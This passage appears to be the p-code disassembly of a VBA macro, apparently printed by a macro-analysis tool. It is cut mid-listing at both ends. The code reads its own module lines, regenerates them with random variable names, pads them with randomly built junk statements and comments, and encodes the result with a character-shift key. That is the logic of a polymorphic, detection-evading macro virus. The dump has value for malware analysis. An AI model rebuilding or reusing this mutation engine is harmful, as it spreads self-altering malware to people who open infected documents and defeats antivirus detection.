' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St N4 
' 	EndIf 
' Line #88:
' 	Ld N3 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #89:
' 	SetStmt 
' 	Ld N2 
' 	Set N5 
' Line #90:
' 	SetStmt 
' 	Ld N1 
' 	Set N6 
' Line #91:
' 	ElseBlock 
' Line #92:
' 	SetStmt 
' 	Ld N1 
' 	Set N5 
' Line #93:
' 	SetStmt 
' 	Ld N2 
' 	Set N6 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Ld W 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #96:
' 	Ld N8 
' 	Ld C 
' 	Add 
' 	St N8 
' Line #97:
' 	StartForVariable 
' 	Ld W 
' 	EndForVariable 
' 	NextVar 
' Line #98:
' 	Ld O5 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld O7 
' 	St V0 
' 	BoS 0x0000 
' 	Ld O2 
' 	St NE 
' 	BoS 0x0000 
' 	GoTo 9 
' 	EndIf 
' Line #99:
' 	StartWithExpr 
' 	Ld N6 
' 	With 
' Line #100:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith COUNTOFLINES 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #101:
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith LINES 0x0002 
' 	St N7 
' Line #102:
' 	Ld N7 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 0 
' 	EndIf 
' Line #103:
' 	Ld N8 
' 	Ld N7 
' 	Concat 
' 	Ld C 
' 	Concat 
' 	St N8 
' Line #104:
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St N9 
' Line #105:
' 	Ld N9 
' 	Ld GR 
' 	Eq 
' 	Ld X 
' 	LitDI2 0x0003 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoSub NA 
' 	BoS 0x0000 
' 	LitStr 0x0001 "'"
' 	Ld NB 
' 	Concat 
' 	Ld C 
' 	Concat 
' 	St U2 
' 	BoS 0x0000 
' 	Ld N8 
' 	Ld U2 
' 	Concat 
' 	St N8 
' 	BoS 0x0000 
' 	Ld U4 
' 	Ld U2 
' 	FnLen 
' 	Add 
' 	St U4 
' 	EndIf 
' Line #106:
' 	LineNum 0 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	Ld N8 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "END SUB"
' 	Concat 
' 	Ld C 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	St N8 
' Line #108:
' 	Ld N8 
' 	FnLen 
' 	Ld U4 
' 	Sub 
' 	St RZ 
' Line #109:
' 	EndWith 
' Line #110:
' 	GoSub O1 
' 	BoS 0x0000 
' 	Ld NB 
' 	St V0 
' Line #111:
' 	Ld N8 
' 	FnLen 
' 	Ld NE 
' 	FnLen 
' 	Eq 
' 	Not 
' 	DoWhile 
' Line #112:
' 	Ld Q 
' 	LitDI2 0x0001 
' 	Add 
' 	St Q 
' Line #113:
' 	Ld H 
' 	LitDI2 0x0001 
' 	Add 
' 	St H 
' Line #114:
' 	Ld N8 
' 	Ld Q 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St NF 
' Line #115:
' 	Ld V0 
' 	Ld H 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St H1 
' Line #116:
' 	Ld NF 
' 	ArgsLd Asc 0x0001 
' 	Ld H1 
' 	ArgsLd Asc 0x0001 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St NG 
' Line #117:
' 	Ld H 
' 	Ld V0 
' 	FnLen 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St H 
' 	EndIf 
' Line #118:
' 	Ld NE 
' 	Ld NG 
' 	Add 
' 	St NE 
' Line #119:
' 	Loop 
' Line #120:
' 	Ld NE 
' 	LitStr 0x0001 "'"
' 	Add 
' 	Ld V0 
' 	Add 
' 	St NE 
' Line #121:
' 	LineNum 9 
' 	LitDI2 0x0005 
' 	St LO 
' Line #122:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St J1 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St J2 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St J3 
' Line #123:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St J4 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St J5 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St J6 
' Line #124:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St J9 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JA 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JB 
' Line #125:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JC 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JD 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JE 
' Line #126:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JF 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JG 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JH 
' Line #127:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JI 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JJ 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JK 
' Line #128:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JL 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld M 
' 	St VX 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JM 
' Line #129:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St V1 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St V2 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St V3 
' Line #130:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St Q1 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St Q2 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St Q3 
' Line #131:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St W1 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St W2 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St W3 
' Line #132:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St V4 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St V5 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St V6 
' Line #133:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St V7 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St V8 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St V9 
' Line #134:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St VA 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St VB 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St VC 
' Line #135:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St NK 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JZ 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JV 
' Line #136:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St TA 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St TB 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St TC 
' Line #137:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St TD 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St TX 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St T4 
' Line #138:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St T5 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St T6 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St T7 
' Line #139:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St T8 
' 	BoS 0x0000 
' 	LitDI2 0x2AA3 
' 	St WL 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St T9 
' Line #140:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JW 
' 	BoS 0x0000 
' 	Ld NC 
' 	St NN 
' 	BoS 0x0000 
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St JX 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St NN 
' Line #141:
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St R0 
' 	BoS 0x0000 
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St RA 
' 	BoS 0x0000 
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St RB 
' Line #142:
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St RC 
' 	BoS 0x0000 
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St RD 
' 	BoS 0x0000 
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St RE 
' Line #143:
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St RF 
' 	BoS 0x0000 
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St RG 
' 	BoS 0x0000 
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St RH 
' Line #144:
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St RI 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St NN 
' 	BoS 0x0000 
' 	GoSub F1 
' 	BoS 0x0000 
' 	Ld F2 
' 	St RJ 
' Line #145:
' 	StartForVariable 
' 	Ld M1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VX 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld WW 
' 	Ld VX 
' 	Ld M1 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Add 
' 	St WW 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld M1 
' 	EndForVariable 
' 	NextVar 
' Line #146:
' 	GoTo NW 
' Line #147:
' 	Label NA 
' Line #148:
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	St NB 
' Line #149:
' 	LitDI2 0x000F 
' 	Ld LO 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld LO 
' 	Add 
' 	FnInt 
' 	St NL 
' Line #150:
' 	Ld NB 
' 	FnLen 
' 	Ld NL 
' 	Eq 
' 	Not 
' 	DoWhile 
' Line #151:
' 	LineNum 6 
' 	LitDI2 0x007A 
' 	LitDI2 0x0030 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0030 
' 	Add 
' 	FnInt 
' 	St NM 
' Line #152:
' 	Ld NM 
' 	LitDI2 0x0039 
' 	Gt 
' 	Ld NM 
' 	LitDI2 0x0041 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 6 
' 	EndIf 
' Line #153:
' 	Ld NM 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld NM 
' 	LitDI2 0x0061 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 6 
' 	EndIf 
' Line #154:
' 	Ld NB 
' 	Ld NM 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St NB 
' Line #155:
' 	Loop 
' Line #156:
' 	Return 
' Line #157:
' 	Label O1 
' Line #158:
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	St NB 
' Line #159:
' 	LitDI2 0x000F 
' 	Ld LO 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld LO 
' 	Add 
' 	FnInt 
' 	St NL 
' Line #160:
' 	Ld NB 
' 	FnLen 
' 	Ld NL 
' 	Eq 
' 	Not 
' 	DoWhile 
' Line #161:
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	St NM 
' Line #162:
' 	Ld NB 
' 	Ld NM 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St NB 
' Line #163:
' 	Loop 
' Line #164:
' 	Return 
' Line #165:
' 	Label F1 
' Line #166:
' 	LitDI4 0x4240 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x03E7 
' 	Add 
' 	FnInt 
' 	St NH 
' Line #167:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St F3 
' Line #168:
' 	Ld F3 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NH 
' 	Ld NN 
' 	Add 
' 	St NJ 
' 	BoS 0x0000 
' 	LitStr 0x0003 " - "
' 	St F6 
' 	Else 
' 	BoSImplicit 
' 	Ld NN 
' 	Ld NH 
' 	Sub 
' 	St NJ 
' 	BoS 0x0000 
' 	LitStr 0x0003 " + "
' 	St F6 
' 	EndIf 
' Line #169:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St F3 
' Line #170:
' 	Ld F3 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "("
' 	St F4 
' 	BoS 0x0000 
' 	LitStr 0x0001 ")"
' 	St F5 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St F4 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St F5 
' 	EndIf 
' Line #171:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St F3 
' Line #172:
' 	Ld F3 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NN 
' 	St F2 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	Ld F4 
' 	Ld NJ 
' 	Concat 
' 	Ld F6 
' 	Concat 
' 	Ld NH 
' 	Concat 
' 	Ld F5 
' 	Concat 
' 	St F2 
' 	EndIf 
' Line #173:
' 	Return 
' Line #174:
' 	Label NU 
' Line #175:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St S 
' Line #176:
' 	Ld S 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "= "
' 	St NO 
' 	EndIf 
' Line #177:
' 	Ld S 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "> "
' 	St NO 
' 	EndIf 
' Line #178:
' 	Ld S 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "< "
' 	St NO 
' 	EndIf 
' Line #179:
' 	Return 
' Line #180:
' 	Label NV 
' Line #181:
' 	LitStr 0x0000 ""
' 	St XZ 
' Line #182:
' 	LitStr 0x0000 ""
' 	St NZ 
' Line #183:
' 	StartForVariable 
' 	Ld XA 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld GI 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #184:
' 	GoSub X2 
' Line #185:
' 	Ld XZ 
' 	Ld C 
' 	Add 
' 	Ld NZ 
' 	Add 
' 	St XZ 
' Line #186:
' 	StartForVariable 
' 	Ld XA 
' 	EndForVariable 
' 	NextVar 
' Line #187:
' 	Ld XZ 
' 	St NZ 
' Line #188:
' 	Return 
' Line #189:
' 	Label X2 
' Line #190:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St NS 
' Line #191:
' 	GoSub NA 
' 	BoS 0x0000 
' 	Ld NB 
' 	St NT 
' Line #192:
' 	LitDI2 0x2710 
' 	LitDI2 0x0064 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0064 
' 	Add 
' 	FnInt 
' 	St NN 
' Line #193:
' 	GoSub F1 
' Line #194:
' 	Ld F2 
' 	St X1 
' Line #195:
' 	LitDI2 0x2710 
' 	LitDI2 0x0064 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0064 
' 	Add 
' 	FnInt 
' 	St NN 
' Line #196:
' 	GoSub F1 
' Line #197:
' 	GoSub NU 
' Line #198:
' 	LitDI2 0x0014 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St F7 
' Line #199:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St S 
' Line #200:
' 	LitDI2 0x001E 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St E2 
' Line #201:
' 	LitDI2 0x001D 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St E3 
' Line #202:
' 	Ld E4 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "$"
' 	St E5 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St E5 
' 	EndIf 
' Line #203:
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St E6 
' Line #204:
' 	Ld S 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "+ "
' 	St S1 
' 	EndIf 
' Line #205:
' 	Ld S 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 "- "
' 	St S1 
' 	EndIf 
' Line #206:
' 	Ld F7 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "IF "
' 	Ld NS 
' 	Concat 
' 	Ld NO 
' 	Concat 
' 	Ld NJ 
' 	Concat 
' 	LitStr 0x0006 " THEN "
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	LitStr 0x0002 "= "
' 	Concat 
' 	Ld NH 
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #207:
' 	Ld F7 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "IF "
' 	Ld NS 
' 	Concat 
' 	Ld NO 
' 	Concat 
' 	Ld F2 
' 	Concat 
' 	LitStr 0x0006 " THEN "
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	LitStr 0x0002 "= "
' 	Concat 
' 	Ld X1 
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #208:
' 	Ld F7 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld NS 
' 	Concat 
' 	Ld S1 
' 	Concat 
' 	Ld X1 
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #209:
' 	Ld F7 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	Ld S1 
' 	Concat 
' 	Ld X1 
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #210:
' 	Ld F7 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld F2 
' 	Concat 
' 	Ld S1 
' 	Concat 
' 	Ld X1 
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #211:
' 	Ld F7 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld X1 
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #212:
' 	Ld F7 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #213:
' 	Ld F7 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	Ld NS 
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	LitStr 0x0002 "+ "
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #214:
' 	Ld F7 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St G3 
' 	BoS 0x0000 
' 	Ld G3 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "REM "
' 	St LW 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0002 "' "
' 	St LW 
' 	BoS 0x0000 
' 	Ld LW 
' 	Ld NS 
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	St NZ 
' 	EndIf 
' 	EndIf 
' Line #215:
' 	Ld F7 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0009 " = UCASE("
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #216:
' 	Ld F7 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0009 " = LCASE("
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #217:
' 	Ld F7 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0007 " = LEN("
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	Ld X9 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #218:
' 	Ld F7 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0007 " = LEN("
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #219:
' 	Ld F7 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub MATHFFUNCT 
' 	BoS 0x0000 
' 	Ld NS 
' 	LitStr 0x0002 " ="
' 	Concat 
' 	Ld MATHF 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #220:
' 	Ld F7 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0006 " = MID"
' 	Concat 
' 	Ld E5 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld E2 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld E3 
' 	Concat 
' 	LitStr 0x0002 " )"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #221:
' 	Ld F7 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0007 " = LEFT"
' 	Concat 
' 	Ld E5 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld E2 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #222:
' 	Ld F7 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0008 " = RIGHT"
' 	Concat 
' 	Ld E5 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld E2 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #223:
' 	Ld F7 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0009 " = STRING"
' 	Concat 
' 	Ld E5 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	Ld NT 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld E6 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #224:
' 	Ld F7 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NS 
' 	LitStr 0x0007 " = CHR("
' 	Concat 
' 	Ld E6 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld C1 
' 	Concat 
' 	St NZ 
' 	EndIf 
' Line #225:
' 	Ld F7 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
